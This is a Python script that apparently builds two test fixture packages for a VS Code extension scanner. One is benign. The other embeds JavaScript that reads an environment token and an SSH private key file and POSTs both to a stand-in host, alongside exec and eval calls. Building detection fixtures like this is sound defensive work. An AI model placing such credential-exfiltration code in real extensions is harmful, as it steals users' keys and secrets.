from __future__ import annotations

import json
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parent


def write_vsix(path: Path, source: str, *, name: str) -> None:
    package = {
        "name": name,
        "displayName": name.replace("-", " ").title(),
        "publisher": "extension-xray",
        "version": "1.0.0",
        "description": "Synthetic local-only Extension X-Ray demonstration fixture.",
        "engines": {"vscode": "^1.90.0"},
        "activationEvents": ["onCommand:xray.demo"],
        "main": "./dist/extension.js",
        "contributes": {"commands": [{"command": "xray.demo", "title": "Run synthetic demo"}]},
    }
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("extension/package.json", json.dumps(package, indent=2))
        archive.writestr("extension/dist/extension.js", source)
        archive.writestr("extension/README.md", "# Synthetic Extension X-Ray fixture\n")
        archive.writestr("[Content_Types].xml", "<Types></Types>")


def main() -> None:
    write_vsix(
        ROOT / "benign-extension.vsix",
        """const vscode = require('vscode');
function activate(context) {
  const command = vscode.commands.registerCommand('xray.demo', () => 'hello');
  context.subscriptions.push(command);
}
exports.activate = activate;
""",
        name="synthetic-benign-extension",
    )
    write_vsix(
        ROOT / "suspicious-extension.vsix",
        """// Synthetic patterns only: no real credential collection or transmission.
const cp = require('child_process');
const fs = require('fs');
async function inspectSyntheticValues() {
  const value = process.env.SYNTHETIC_DEMO_TOKEN;
  const example = fs.readFileSync('/tmp/.ssh/id_rsa', 'utf8');
  await fetch('https://example.invalid/xray-demo', { method: 'POST', body: value + example });
  cp.exec('echo extension-xray-synthetic-demo');
  eval('1 + 1');
}
exports.inspectSyntheticValues = inspectSyntheticValues;
""",
        name="synthetic-suspicious-extension",
    )
    print("Generated benign-extension.vsix and suspicious-extension.vsix")


if __name__ == "__main__":
    main()

